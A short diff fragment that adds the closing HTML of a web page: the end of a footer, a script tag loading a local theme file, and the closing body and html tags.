+  </div>
+</footer>
+<script src="../assets/theme.js"></script>
+</body>
+</html>
